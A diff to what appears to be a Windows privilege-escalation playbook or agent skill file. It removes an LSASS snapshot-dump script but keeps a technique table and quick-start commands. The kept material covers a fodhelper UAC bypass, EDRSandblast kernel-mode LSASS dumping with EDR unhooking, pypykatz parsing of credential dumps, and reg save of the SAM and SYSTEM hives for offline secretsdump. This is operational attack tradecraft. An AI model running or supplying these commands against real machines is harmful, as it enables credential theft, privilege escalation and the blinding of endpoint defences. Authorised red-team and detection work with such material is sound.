@@ -28,7 +28,6 @@ scripts:
   - scripts/service_hijack_audit.ps1
   - scripts/uac_bypass.ps1
   - scripts/byovd_loader.c
-  - scripts/lsass_snapshot_dump.c
 ---
 
 # Windows Privilege Escalation
@@ -60,8 +59,8 @@ scripts:
 | Kernel EoP CVE (CLFS CVE-2025-29824/32701; CVE-2025-62215) | T1068 | CWE-416, CWE-362 | references/kernel-byovd.md | scripts/byovd_loader.c |
 | BYOVD admin→kernel / EDR-blind (CVE-2025-7771, EDRSandblast) | T1068, T1562.001 | CWE-782 | references/kernel-byovd.md | scripts/byovd_loader.c |
 | Privileged token rights (SeBackup/SeRestore/SeLoadDriver/SeDebug) | T1134, T1068 | CWE-269 | references/kernel-byovd.md | scripts/byovd_loader.c |
-| LSASS dump (comsvcs / PssCaptureSnapshot / nanodump) | T1003.001 | CWE-522 | references/credential-harvesting.md | scripts/lsass_snapshot_dump.c |
-| SAM/SYSTEM + VSS offline secretsdump | T1003.002 | CWE-522 | references/credential-harvesting.md | scripts/lsass_snapshot_dump.c |
+| LSASS dump (comsvcs / PssCaptureSnapshot / nanodump) | T1003.001 | CWE-522 | references/credential-harvesting.md | - |
+| SAM/SYSTEM + VSS offline secretsdump | T1003.002 | CWE-522 | references/credential-harvesting.md | - |
 | DPAPI / credential vault / browser secrets | T1555.004, T1555.003 | CWE-522 | references/credential-harvesting.md | - |
 
 ## Quick Start
@@ -93,9 +92,9 @@ powershell -ep bypass -File scripts/uac_bypass.ps1 -Method fodhelper -Payload "c
 #     (verify driver is NOT on Microsoft blocklist for the build first)
 .\EDRSandblast.exe --kernelmode dump_lsass --usermode unhook
 
-# 3. Credentials (run from SYSTEM/admin)
-gcc scripts/lsass_snapshot_dump.c -o snap.exe -lDbghelp   # PssCaptureSnapshot dump (stealthier)
-.\snap.exe lsass.dmp ; pypykatz lsa minidump lsass.dmp    # parse offline, off-host
+# 3. Credentials (run from SYSTEM/admin) — see references/credential-harvesting.md for the PssCaptureSnapshot
+#    / comsvcs MiniDump / nanodump tradecraft and OPSEC (parse the dump OFF-host).
+pypykatz lsa minidump lsass.dmp                           # parse an acquired dump offline, off-host
 reg save HKLM\SAM sam.bak & reg save HKLM\SYSTEM sys.bak  # impacket-secretsdump -sam sam.bak -system sys.bak LOCAL
 ```
 
